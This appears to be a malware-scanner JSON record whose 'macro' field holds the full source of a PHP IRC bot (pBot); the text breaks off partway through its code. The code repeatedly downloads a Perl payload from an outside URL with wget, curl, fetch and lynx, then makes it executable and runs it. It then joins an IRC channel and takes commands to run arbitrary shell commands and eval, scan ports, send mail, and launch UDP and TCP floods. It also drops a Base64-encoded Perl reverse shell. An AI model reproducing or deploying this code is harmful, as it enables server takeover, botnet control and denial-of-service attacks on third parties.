{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "open": "May open a file",
            "popen": "May run an executable file or a system command on a Mac",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?php\n\nset_time_limit(0); \nerror_reporting(0);\n\n$url[2] = \"http://mxxx.webng.com/icon.txt\";\n$sfe[2] = \"exnam_logsd\";\nexec(); shell_exec(); system(); passthru();\nexec(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nexec(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nexec(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nexec(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nexec(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nexec(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nshell_exec(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nshell_exec(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nshell_exec(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nshell_exec(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nshell_exec(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nshell_exec(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nsystem(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nsystem(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nsystem(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nsystem(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nsystem(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\nsystem(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\npassthru(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\npassthru(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\npassthru(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\npassthru(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\npassthru(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\npassthru(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");\n//-- /tmp\nexec(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nexec(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nexec(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nexec(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nexec(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nexec(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nshell_exec(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nshell_exec(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nshell_exec(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nshell_exec(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nshell_exec(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nshell_exec(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nsystem(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nsystem(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nsystem(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nsystem(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nsystem(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\nsystem(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\npassthru(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\npassthru(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\npassthru(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\npassthru(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\npassthru(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\npassthru(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");\n//-- /var/tmp\nexec(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nexec(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nexec(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nexec(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nexec(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nexec(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nshell_exec(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nshell_exec(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nshell_exec(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nshell_exec(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nshell_exec(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nshell_exec(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nsystem(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nsystem(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nsystem(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nsystem(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nsystem(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\nsystem(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\npassthru(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\npassthru(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\npassthru(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\npassthru(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\npassthru(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\npassthru(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");\n\nset_time_limit(0); \nerror_reporting(0); \necho \"ok!\";\n\nclass pBot {\n\n var $config = array(\"server\"=>\"irc.javairc.org\",\n                     \"port\"=>\"6667\",\n                     \"pass\"=>\"cok\",\n                     \"prefix\"=>\"HHHH\",\n                     \"maxrand\"=>\"4\",\n                     \"chan\"=>\"#korak\",\n                     \"chan2\"=>\"#korak\",\n                     \"key\"=>\"cok\",\n                     \"modes\"=>\"+i\",\n                     \"password\"=>\"tempek\",\n                     \"trigger\"=>\".\",\n                     \"hostauth\"=>\"BoCaH.LaLi.OmaH\" // * for any hostname (remember: /setvhost xdevil.org)\n                     );\n var $users = array(); \n function start() \n { \n    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) \n       $this->start(); \n    $ident = $this->config['prefix'];\n    $alph = range(\"0\",\"9\");\n    for($i=0;$i<$this->config['maxrand'];$i++) \n       $ident .= $alph[rand(0,9)];\n    if(strlen($this->config['pass'])>0) \n       $this->send(\"PASS \".$this->config['pass']);\n    $this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");\n    $this->set_nick();\n    $this->main();\n } \n function main() \n { \n    while(!feof($this->conn)) \n    { \n       $this->buf = trim(fgets($this->conn,512)); \n       $cmd = explode(\" \",$this->buf); \n       if(substr($this->buf,0,6)==\"PING :\") \n       { \n          $this->send(\"PONG :\".substr($this->buf,6)); \n       } \n       if(isset($cmd[1]) && $cmd[1] ==\"001\") \n       { \n          $this->send(\"MODE \".$this->nick.\" \".$this->config['modes']); \n          $this->join($this->config['chan'],$this->config['key']);\n          if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n          else { $safemode = \"off\"; }\n          $uname = php_uname();\n          $this->privmsg($this->config['chan2'],\"\\2Uname\\2: $uname \\2Mode\\2: $safemode \");\n       } \n       if(isset($cmd[1]) && $cmd[1]==\"433\") \n       { \n          $this->set_nick(); \n       } \n       if($this->buf != $old_buf) \n       { \n          $mcmd = array(); \n          $msg = substr(strstr($this->buf,\" :\"),2); \n          $msgcmd = explode(\" \",$msg); \n          $nick = explode(\"!\",$cmd[0]); \n          $vhost = explode(\"@\",$nick[1]); \n          $vhost = $vhost[1]; \n          $nick = substr($nick[0],1); \n          $host = $cmd[0]; \n          if($msgcmd[0]==$this->nick) \n          { \n           for($i=0;$i<count($msgcmd);$i++) \n              $mcmd[$i] = $msgcmd[$i+1]; \n          } \n          else \n          { \n           for($i=0;$i<count($msgcmd);$i++) \n              $mcmd[$i] = $msgcmd[$i]; \n          } \n          if(count($cmd)>2) \n          { \n             switch($cmd[1]) \n             { \n                case \"QUIT\": \n                   if($this->is_logged_in($host)) \n                   { \n                      $this->log_out($host); \n                   } \n                break; \n                case \"PART\": \n                   if($this->is_logged_in($host)) \n                   { \n                      $this->log_out($host); \n                   } \n                break; \n                case \"PRIVMSG\": \n                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")) \n                   { \n                      if(substr($mcmd[0],0,1)==\".\") \n                      { \n                         switch(substr($mcmd[0],1)) \n                         { \n                            case \"cik\": \n                              if($mcmd[1]==$this->config['password']) \n                              { \n                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: $nick !!\"); \n                                 $this->log_in($host); \n                              } \n                              else \n                              { \n                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: $nick  jancok.. lu...!\"); \n                              } \n                            break; \n                         } \n                      } \n                   } \n                   elseif($this->is_logged_in($host)) \n                   { \n                      if(substr($mcmd[0],0,1)==\".\") \n                      { \n                         switch(substr($mcmd[0],1)) \n                         { \n                            case \"restart\": \n                               $this->send(\"QUIT :Njomplang sek boz $nick\");\n                               fclose($this->conn); \n                               $this->start(); \n                            break; \n                            case \"mail\": //mail to from subject message \n                               if(count($mcmd)>4) \n                               { \n                                  $header = \"From: <\".$mcmd[2].\">\"; \n                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Impossivel mandar e-mail.\");\n                                  } \n                                  else \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Mensagem enviada para \\2\".$mcmd[1].\"\\2\"); \n                                  } \n                               } \n                            break;\n                            case \"safe\":\n                               if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\")\n                               {\n                               $safemode = \"on\";\n                               }\n                               else {\n                               $safemode = \"off\";\n                               }\n                               $this->privmsg($this->config['chan'],\"[\\2safe mode\\2]: \".$safemode.\"\");\n                            break;\n                            case \"inbox\": //teste inbox\n                               if(isset($mcmd[1]))\n                               {\n                                  $token = md5(uniqid(rand(), true));\n                                  $header = \"From: <inbox\".$token.\"@xdevil.org>\";\n                                  $a = php_uname();\n                                  $b = getenv(\"SERVER_SOFTWARE\");\n                                  $c = gethostbyname($_SERVER[\"HTTP_HOST\"]);\n                                  if(!mail($mcmd[1],\"InBox Test\",\"#crew@corp. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: $a \\nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <admin@xdevil.org>\",$header))\n                                  {\n                                     $this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Unable to send\");\n                                  }\n                                  else\n                                  {\n                                     $this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Message sent to \\2\".$mcmd[1].\"\\2\");\n                                  }\n                               }\n                            break;\n                            case \"conback\":\n                               if(count($mcmd)>2)\n                               {\n                                  $this->conback($mcmd[1],$mcmd[2]);\n                               }\n                            break;\n                            case \"dns\": \n                               if(isset($mcmd[1])) \n                               { \n                                  $ip = explode(\".\",$mcmd[1]); \n                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1])); \n                                  } \n                                  else \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1])); \n                                  } \n                               } \n                            break; \n\t\t\t\n                        case \"help\": \n                         \t\t\t   $this->privmsg($this->config['chan'],\"[\\2comand help\\2]: Kowe Koyo Djembodz\");\n              \t\t\t  break;\n\n\n\n\n              \t\t\n                            case \"info\":\n                            case \"vunl\":\n                               if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n                               else { $safemode = \"off\"; }\n                               $uname = php_uname();\n                               $this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");\n                               $this->privmsg($this->config['chan'],\"[\\2vuln\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\");\n                            break;\n                            case \"uname\":\n                               if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n                               else { $safemode = \"off\"; }\n                               $uname = php_uname();\n                               $this->privmsg($this->config['chan'],\"[\\2info\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\" ( $uname (Mode: $safemode) )\");\n                            break;\n                            case \"rndnick\": \n                               $this->set_nick(); \n                            break; \n                            case \"raw\":\n                               $this->send(strstr($msg,$mcmd[1])); \n                            break; \n                            case \"eval\":\n                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));\n                            break;\n\t\t\t                case \"sexec\":\n                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                               $exec = shell_exec($command); \n                               $ret = explode(\"\\n\",$exec); \n                               for($i=0;$i<count($ret);$i++) \n                                  if($ret[$i]!=NULL) \n                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); \n                            break; \n\n                            case \"exec\": \n                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                               $exec = exec($command); \n                               $ret = explode(\"\\n\",$exec); \n                               for($i=0;$i<count($ret);$i++) \n                                  if($ret[$i]!=NULL) \n                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); \n                            break; \n\n                            case \"passthru\": \n                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                               $exec = passthru($command); \n                               $ret = explode(\"\\n\",$exec); \n                               for($i=0;$i<count($ret);$i++) \n                                  if($ret[$i]!=NULL) \n                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); \n                            break; \n\n                            case \"popen\": \n                               if(isset($mcmd[1])) \n                               { \n                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                                  $this->privmsg($this->config['chan'],\"[\\2popen\\2]: $command\");\n                                  $pipe = popen($command,\"r\"); \n                                  while(!feof($pipe)) \n                                  { \n                                     $pbuf = trim(fgets($pipe,512)); \n                                     if($pbuf != NULL) \n                                        $this->privmsg($this->config['chan'],\"     : $pbuf\"); \n                                  } \n                                  pclose($pipe); \n                               }  \n\t\t\t   \n                            case \"system\": \n                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                               $exec = system($command); \n                               $ret = explode(\"\\n\",$exec); \n                               for($i=0;$i<count($ret);$i++) \n                                  if($ret[$i]!=NULL) \n                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); \n                            break; \n\n\n                            case \"pscan\": // .pscan 127.0.0.1 6667 \n                               if(count($mcmd) > 2) \n                               { \n                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) \n                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\"); \n                                  else \n                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\"); \n                               } \n                            break; \n                            case \"ud.server\": // .ud.server <server> <port> [password] \n                               if(count($mcmd)>2) \n                               { \n                                  $this->config['server'] = $mcmd[1]; \n                                  $this->config['port'] = $mcmd[2]; \n                                  if(isset($mcmcd[3])) \n                                  { \n                                   $this->config['pass'] = $mcmd[3]; \n                                   $this->privmsg($this->config['chan'],\"[\\2update\\2]: Server trocado para \".$mcmd[1].\":\".$mcmd[2].\" Senha: \".$mcmd[3]); \n                                  } \n                                  else \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2update\\2]: Server trocado para \".$mcmd[1].\":\".$mcmd[2]); \n                                  } \n                               } \n                            break; \n                            case \"download\": \n                               if(count($mcmd) > 2) \n                               { \n                                  if(!$fp = fopen($mcmd[2],\"w\")) \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download. Permissao negada.\"); \n                                  } \n                                  else \n                                  { \n                                     if(!$get = file($mcmd[1])) \n                                     { \n                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download de \\2\".$mcmd[1].\"\\2\"); \n                                     } \n                                     else \n                                     { \n                                        for($i=0;$i<=count($get);$i++) \n                                        { \n                                           fwrite($fp,$get[$i]); \n                                        } \n                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: Arquivo \\2\".$mcmd[1].\"\\2 baixado para \\2\".$mcmd[2].\"\\2\"); \n                                     } \n                                     fclose($fp); \n                                  } \n                               }\n                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/file /tmp/file\"); }\n                            break; \n                            case \"die\": \n                               $this->send(\"QUIT :die command from $nick\");\n                               fclose($this->conn); \n                               exit; \n                            case \"logout\": \n                               $this->log_out($host); \n                               $this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick deslogado!\"); \n                            break; \n                            case \"udpflood\": \n                               if(count($mcmd)>3) \n                               { \n                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); \n                               } \n                            break; \n                            case \"tcpflood\": \n                               if(count($mcmd)>5) \n                               { \n                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); \n                               } \n                            break; \n                         } \n                      } \n                   } \n                break; \n             } \n          } \n       } \n       $old_buf = $this->buf; \n    } \n    $this->start(); \n } \n function send($msg) \n { \n    fwrite($this->conn,\"$msg\\r\\n\"); \n\n } \n function join($chan,$key=NULL) \n { \n    $this->send(\"JOIN $chan $key\"); \n } \n function privmsg($to,$msg)\n {\n    $this->send(\"PRIVMSG $to :$msg\");\n }\n function notice($to,$msg)\n {\n    $this->send(\"NOTICE $to :$msg\");\n }\n function is_logged_in($host) \n { \n    if(isset($this->users[$host])) \n       return 1; \n    else \n       return 0; \n } \n function log_in($host) \n { \n    $this->users[$host] = true; \n } \n function log_out($host) \n { \n    unset($this->users[$host]); \n } \n function set_nick() {\n\n$querym=array(\n\"?\", \"!\", \"^^\", \" ^^\", \" :(\",\" :)\", \" ~:>\", \" :P~\", \" :D\", \".\", \"a\", \"i\", \"u\", \"e\", \"o\",\n\"z\", \"v\", \"z\", \"x\", \"c\", \"p\", \"m\", \"t\", \"k\", \"b\", \"s\", \"u\", \"bot\", \"g\", \"lo\", \"jo\", \"lol\"\n);\n$tsu1=array(\"`\",\"|\",\"[\",\"]\",\"{\",\"}\",\"^\",\"_\");\n$tsu2=array(\"`\",\"|\",\"[\",\"]\",\"{\",\"}\",\"^\",\"-\",\"\\\\\",\"_\");\n$nicky=array(\"ErrOrz\");\n$usr1=array(\"Fxz\");\n\n  $this->nick = $nicky[rand(0,count($nicky) - 1)];\n\n    #$this->nick .= $this->config['prefix']; \n    for($i=0;$i<$this->config['maxrand'];$i++) \n      # $this->nick .= mt_rand(0,9); \n    $this->send(\"NICK [\".rand(100, 9999).\"]\".$this->nick);\n } \n  function udpflood($host,$packetsize,$time) {\n\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\"); \n\t$packet = \"\";\n\tfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }\n\t$timei = time();\n\t$i = 0;\n\twhile(time()-$timei < $time) {\n\t\t$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);\n      \tfwrite($fp,$packet);\n       \tfclose($fp);\n\t\t$i++;\n\t}\n\t$env = $i * $packetsize;\n\t$env = $env / 1048576;\n\t$vel = $env / $time;\n\t$vel = round($vel);\n\t$env = round($env);\n\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood SeLsAi!\\2]: $env MB enviados / Media: $vel MB/s \");\n}\n function tcpflood($host,$packets,$packetsize,$port,$delay) \n { \n    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\"); \n    $packet = \"\"; \n    for($i=0;$i<$packetsize;$i++) \n       $packet .= chr(mt_rand(1,256)); \n    for($i=0;$i<$packets;$i++) \n    { \n       if(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5)) \n       { \n          $this->privmsg($this->config['chan'],\"[\\2TcpFlood\\2]: Error: <$e>\"); \n          return 0; \n       } \n       else \n       { \n          fwrite($fp,$packet); \n          fclose($fp); \n       } \n       sleep($delay); \n    } \n    $this->privmsg($this->config['chan'],\"[\\2TcpFlood SelSai!\\2]: Config - $packets pacotes para $host:$port.\"); \n }\n function conback($ip,$port)\n {\n    $this->privmsg($this->config['chan'],\"[\\2conback\\2]: konek ke $ip:$port\");\n    $dc_source = \"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==\";\n    if (is_writable(\"/tmp\"))\n    {\n      if (file_exists(\"/tmp/dc.pl\")) { unlink(\"/tmp/dc.pl\"); }\n      $fp=fopen(\"/tmp/dc.pl\",\"w\");\n      